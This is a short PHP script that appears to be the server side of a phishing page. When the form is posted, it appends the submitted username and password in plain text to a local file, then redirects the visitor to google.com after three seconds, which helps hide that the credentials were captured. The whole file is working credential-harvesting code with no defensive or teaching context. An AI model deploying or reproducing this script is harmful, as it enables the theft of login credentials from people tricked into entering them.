<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  $file = fopen("file.txt", "a");
  fwrite($file, "username: $username \t password:$password");
  fclose($file);

  echo "<script>

        setTimeout(function(){

            window.location.href='https://www.google.com';
        
        },3000)
        
        </script>";

  exit();
}
